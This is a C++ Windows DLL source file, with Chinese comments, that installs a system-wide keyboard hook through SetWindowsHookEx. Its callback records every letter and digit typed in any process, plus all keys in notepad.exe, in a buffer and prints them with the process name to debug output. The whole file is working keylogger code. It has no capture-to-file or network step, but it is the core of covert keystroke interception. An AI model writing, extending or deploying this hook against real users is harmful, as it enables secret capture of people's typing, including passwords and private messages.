// dllmain.cpp : 定义 DLL 应用程序的入口点。
#include "pch.h"
#include <iostream>
#include <vector>

#define DllExport __declspec(dllexport)
#define DEF_PROCESS_NAME L"notepad.exe"

using namespace std;

HMODULE myModule = NULL;
HHOOK myHook = NULL;
int pos = 0;
vector<WCHAR> result;

BOOL APIENTRY DllMain(HMODULE hModule,
    DWORD  ul_reason_for_call,
    LPVOID lpReserved
)
{
    switch (ul_reason_for_call)
    {
    case DLL_PROCESS_ATTACH:
        myModule = hModule;
        break;
    case DLL_THREAD_ATTACH:
    case DLL_THREAD_DETACH:
    case DLL_PROCESS_DETACH:
        break;
    }
    return TRUE;
}

LRESULT CALLBACK KeyboardProc(
    _In_ int    code,
    _In_ WPARAM wParam,
    _In_ LPARAM lParam
) {
    WCHAR szPath[MAX_PATH] = { 0 };
    WCHAR* path = NULL;
    if (code == 0)// 
    {
        GetModuleFileName(NULL, szPath, MAX_PATH);  // 获取当前进程的PE文件路径
        path = wcsrchr(szPath, '\\'); // 从一个字符串中寻找某个字符最后出现的位置。

        WCHAR reee = (WCHAR)wParam;

        if (!_wcsicmp(path + 1, DEF_PROCESS_NAME) || wParam >= 0x30 && wParam <= 0x39 || wParam >= 0x41 && wParam <= 0x5A)
        {
            OutputDebugString(path + 1);//输出进程文件名
            result.push_back((WCHAR)wParam);
            OutputDebugString(&reee);
        }

    }
    return CallNextHookEx(myHook, code, wParam, lParam);
}

extern "C" {
    DllExport void HookStart() {
        myHook = SetWindowsHookEx(WH_KEYBOARD, KeyboardProc, myModule, 0);
    }

    DllExport void HookStop() {
        UnhookWindowsHookEx(myHook);
        myHook = NULL;
    }
}